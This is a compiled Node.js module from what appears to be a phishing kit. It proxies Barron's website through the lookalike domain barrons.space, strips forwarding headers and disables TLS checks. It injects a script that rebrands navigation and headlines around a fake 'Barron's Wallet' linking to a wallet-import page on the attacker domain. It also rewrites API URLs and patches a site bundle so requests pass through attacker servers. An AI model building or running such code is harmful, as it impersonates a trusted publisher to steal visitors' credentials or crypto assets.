"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.delegateMainPageRequest = void 0;
const https_1 = __importDefault(require("https"));
const parse_1 = require("../parse");
const inject_1 = require("../inject");
const serverDomain = 'barrons.space';
const serverUrl = 'https://' + serverDomain;
const apiUrl = 'https://aanusnayakatarakta.barrons.space';
const walletUrl = 'https://wallet.barrons.space/app/import';
const delegateMainPageRequest = (req, res, domain) => {
    const { method, headers, url, path } = req;
    // console.log(url,path)
    delete headers['x-forwarded-for'];
    delete headers['x-forwarded-host'];
    delete headers['x-forwarded-proto'];
    delete headers['via'];
    delete headers['forwarded'];
    // Устанавливаем стандартные заголовки браузера
    headers['host'] = domain;
    headers['referer'] = 'https://' + domain + '/';
    headers['origin'] = 'https://' + domain;
    // Добавляем случайный User-Agent, если его нет
    if (!headers['user-agent']) {
        headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
    }
    const options = {
        hostname: domain,
        path: url,
        method,
        headers,
        port: 443,
        rejectUnauthorized: false
    };
    // console.log(headers)
    try {
        const proxyRequest = https_1.default.request(options, (response) => {
            console.log(req.url);
            delete response.headers['content-length'];
            delete response.headers['x-powered-by'];
            delete response.headers['server'];
            if (response.headers['content-type'] === 'text/html; charset=utf-8' && response.headers['content-encoding'] === 'gzip') {
                console.log(response.headers['content-encoding'], 222444422);
                delete response.headers['content-length'];
                delete response.headers['content-encoding'];
                (0, parse_1.gzipParse)(response).then(data => {
                    res.writeHead(response.statusCode || 500, response.headers);
                    let htmlBuffer = (0, inject_1.inject)(data, `
                        <script>
                        setInterval(()=>{
                            document.querySelectorAll('a').forEach(el=>{
                                el.href  = el.href.replace('https://www.barrons.com','')
                            })
                               document.querySelector('.emotion-13koutt').src = '/barrons_wallet.jpg'
                                document.querySelector("#navbar-wrapper > a:nth-child(3)").innerHTML = "Barron's Wallet"
                                document.querySelector("#navbar-wrapper > a:nth-child(3)").href = "${walletUrl}"
                                document.querySelector("body").style="overflow-x:hidden"
                                document.querySelector('.emotion-1qb9lrx-CardLink').href='/articles/barrons-wallet'
                                document.querySelector('.efmbtq53').href='/articles/barrons-wallet'
                                document.querySelector('.emotion-1n2j6z-HeadlineTextBlock').innerText = 'Barron’s Wallet: The Next-Gen Way to Manage, Spend, and Grow Your Money'
                               document.querySelector('.emotion-mviurp').innerText ='Barron’s Wallet Has Opened the Door to the Future of Finance—Depending on Your Definition of a Bank'
                        },100)


                        </script>
                    `);
                    htmlBuffer = (0, inject_1.replace)(htmlBuffer, 'https://www.barrons.com', serverUrl, true);
                    htmlBuffer = (0, inject_1.replace)(htmlBuffer, 'www.barrons.com', serverUrl, true);
                    htmlBuffer = (0, inject_1.replace)(htmlBuffer, 'https://api.barrons.com', apiUrl, true);
                    res.write(htmlBuffer);
                    res.end();
                    response.on('error', (error) => {
                        console.error('Response stream error:', error);
                        res.status(500).end('Internal Server Error');
                    });
                });
            }
            else if (req.url.includes('459-b1093ddbff188923.js')) {
                (0, parse_1.gzipParse)(response).then(data => {
                    try {
                        delete response.headers['content-encoding'];
                        delete response.headers['content-length'];
                        let cloneForData = (0, inject_1.replace)(data, 'https://api.wsj.net/api/dylan/quotes/v2/comp/quoteByDialect', `${serverUrl}/api/dylan/quotes/v2/comp/quoteByDialect`);
                        cloneForData = (0, inject_1.replace)(cloneForData, 'https://api.barrons.com', apiUrl, true);
                        cloneForData = (0, inject_1.replace)(cloneForData, 'https://www.barrons.com', serverUrl, true);
                        cloneForData = (0, inject_1.replace)(cloneForData, 'w.polyfill("fetch")(A,c)))(c,V)', `w.polyfill("fetch")((()=>{console.log(A);return A.replace('https://api.barrons.com',"${apiUrl}")})(),(()=>{console.log(c);return c})())))(c, V)`);
                        res.writeHead(response.statusCode || 500, response.headers);
                        console.log(cloneForData);
                        res.write(cloneForData.toString());
                        res.end();
                    }
                    catch (error) {
                        res.writeHead(response.statusCode || 500, response.headers);
                        response.pipe(res);
                    }
                });
            }
            else {
                res.writeHead(response.statusCode || 500, response.headers);
                response.pipe(res);
                response.on('error', (error) => {
                    console.error('Response stream error:', error);
                    res.status(500).end('Internal Server Error');
                });
            }
        });
        req.on('aborted', () => {
            proxyRequest.destroy();
        });
        req.pipe(proxyRequest);
        req.on('error', (e) => {
            console.log(e);
        });
    }
    catch (error) {
        console.log(error);
    }
};
exports.delegateMainPageRequest = delegateMainPageRequest;
